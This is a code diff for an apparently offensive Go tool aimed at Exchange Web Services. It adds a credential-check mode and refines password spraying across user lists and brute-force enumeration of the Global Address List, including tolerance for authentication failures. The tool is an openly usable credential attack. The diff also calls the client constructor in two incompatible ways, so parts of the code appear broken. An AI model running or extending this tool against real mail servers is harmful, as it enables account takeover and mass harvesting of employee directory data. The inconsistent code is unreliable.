@@ -19,9 +19,10 @@ import (
 
 func main() {
 	url := flag.String("url", "", "EWS endpoint URL (e.g. https://mail.target.com/EWS/Exchange.asmx)")
-	user := flag.String("user", "", "Username for GAL enumeration (DOMAIN\\user or user@domain.com)")
+	user := flag.String("user", "", "Username (DOMAIN\\user or user@domain.com)")
 	userfile := flag.String("userfile", "", "File of usernames for password spraying (one per line)")
 	pass := flag.String("pass", "", "Password")
+	enumGAL := flag.Bool("enum", false, "Enumerate the Global Address List after authenticating")
 	format := flag.String("format", "csv", "Output format: csv, json, emails (enum) or csv, json (spray)")
 	outfile := flag.String("o", "", "Output file (default: stdout)")
 	ntlm := flag.Bool("ntlm", true, "Use NTLM authentication (default true, set -ntlm=false for basic)")
@@ -50,8 +51,34 @@ func main() {
 
 	if *userfile != "" {
 		runSpray(*url, *userfile, *pass, *format, *outfile, *ntlm, *timeout, *delay, *workers, *conns)
-	} else {
+	} else if *enumGAL {
 		runEnum(*url, *user, *pass, *format, *outfile, *ntlm, *timeout, *depth, *delay, *workers, *conns)
+	} else {
+		runAuthCheck(*url, *user, *pass, *ntlm, *timeout, *conns)
+	}
+}
+
+// --- Auth Check Mode ---
+
+func runAuthCheck(url, user, pass string, ntlm bool, timeout, conns int) {
+	client := ews.NewClient(ews.ClientOpts{
+		NTLM: ntlm, TimeoutSec: timeout, MaxConns: conns, UseCookies: true,
+	})
+
+	fmt.Fprintf(os.Stderr, "[*] Testing credentials against %s\n", url)
+	fmt.Fprintf(os.Stderr, "[*] User: %s\n", user)
+
+	result, err := ews.TestAuth(client, url, user, pass)
+
+	switch result {
+	case ews.AuthSuccess:
+		fmt.Fprintf(os.Stderr, "[+] VALID credentials: %s\n", user)
+	case ews.AuthFailed:
+		fmt.Fprintf(os.Stderr, "[-] INVALID credentials: %s\n", user)
+		os.Exit(1)
+	case ews.AuthError:
+		fmt.Fprintf(os.Stderr, "[!] ERROR: %v\n", err)
+		os.Exit(2)
 	}
 }
 
@@ -70,8 +97,6 @@ func runSpray(url, userfile, pass, format, outfile string, ntlm bool, timeout, d
 	fmt.Fprintf(os.Stderr, "[*] Password spray against %s\n", url)
 	fmt.Fprintf(os.Stderr, "[*] Users: %d, workers: %d, connections: %d\n", len(users), workers, conns)
 
-	client := ews.NewClient(ntlm, timeout, conns)
-
 	type sprayResult struct {
 		User   string `json:"user"`
 		Status string `json:"status"`
@@ -82,12 +107,17 @@ func runSpray(url, userfile, pass, format, outfile string, ntlm bool, timeout, d
 	var attemptCount atomic.Int64
 	totalUsers := int64(len(users))
 
-	workCh := make(chan string, len(users))
+	workCh := make(chan string, workers*2)
 	var wg sync.WaitGroup
 
 	clearProgress := func() {
 		fmt.Fprintf(os.Stderr, "\r%-100s\r", "")
 	}
+
+	client := ews.NewClient(ews.ClientOpts{
+		NTLM: ntlm, TimeoutSec: timeout, MaxConns: conns,
+		DisableKeepAlive: ntlm, // NTLM binds auth to TCP connection; must not reuse across users
+	})
 
 	// Worker
 	sprayWorker := func() {
@@ -214,7 +244,7 @@ type enumWork struct {
 }
 
 func runEnum(url, user, pass, format, outfile string, ntlm bool, timeout, depth, delay, workers, conns int) {
-	client := ews.NewClient(ntlm, timeout, conns)
+	client := ews.NewClient(ntlm, timeout, conns, true)
 
 	var mu sync.Mutex
 	seen := make(map[string]ews.Contact)
@@ -226,10 +256,16 @@ func runEnum(url, user, pass, format, outfile string, ntlm bool, timeout, depth,
 
 	workCh := make(chan enumWork, 10000)
 	var pending atomic.Int64
-	doneCh := make(chan struct{})
+	doneCh := make(chan struct{}, 1)
 	abortCh := make(chan struct{})
 	var abortOnce sync.Once
 	var workerWg sync.WaitGroup
+	var anySuccess atomic.Bool
+	var authErrors atomic.Int64
+	authAbortThreshold := int64(workers)
+	if totalTopLevel < authAbortThreshold {
+		authAbortThreshold = totalTopLevel
+	}
 
 	clearProgress := func() {
 		fmt.Fprintf(os.Stderr, "\r%-100s\r", "")
@@ -278,6 +314,9 @@ func runEnum(url, user, pass, format, outfile string, ntlm bool, timeout, depth,
 				}
 
 				requestCount.Add(1)
+				if item.depth == 1 {
+					topLevelDone.Add(1)
+				}
 				printStatus(item.prefix)
 
 				contacts, truncated, err := ews.ResolveNames(client, url, user, pass, item.prefix)
@@ -291,14 +330,21 @@ func runEnum(url, user, pass, format, outfile string, ntlm bool, timeout, depth,
 					if strings.Contains(errStr, "authentication failed") ||
 						strings.Contains(errStr, "LogonDenied") ||
 						strings.Contains(errStr, "AccessDenied") {
-						fmt.Fprintf(os.Stderr, "[!] Authentication error — aborting. Check your credentials and auth method.\n")
-						abortOnce.Do(func() { close(abortCh) })
-						finishItem()
-						return
+						count := authErrors.Add(1)
+						// Only abort if no request has ever succeeded
+						// (load-balanced Exchange may reject some requests)
+						if !anySuccess.Load() && count >= authAbortThreshold {
+							fmt.Fprintf(os.Stderr, "[!] All requests failing auth — aborting. Check your credentials and auth method.\n")
+							abortOnce.Do(func() { close(abortCh) })
+							finishItem()
+							return
+						}
 					}
 					finishItem()
 					continue
 				}
+
+				anySuccess.Store(true)
 
 				mu.Lock()
 				for _, c := range contacts {
@@ -340,7 +386,6 @@ func runEnum(url, user, pass, format, outfile string, ntlm bool, timeout, depth,
 		default:
 		}
 		enqueue(enumWork{prefix: string(ch), depth: 1})
-		topLevelDone.Add(1)
 	}
 
 	select {
@@ -349,8 +394,14 @@ func runEnum(url, user, pass, format, outfile string, ntlm bool, timeout, depth,
 	}
 
 shutdown:
-	close(workCh)
+	// Signal abort so workers stop reading from workCh
+	abortOnce.Do(func() { close(abortCh) })
+	// Wait for workers to exit before closing workCh
 	workerWg.Wait()
+	// Drain any remaining items
+	close(workCh)
+	for range workCh {
+	}
 
 	clearProgress()
 	fmt.Fprintf(os.Stderr, "[*] Enumeration complete: %d unique entries, %d requests\n", len(seen), requestCount.Load())
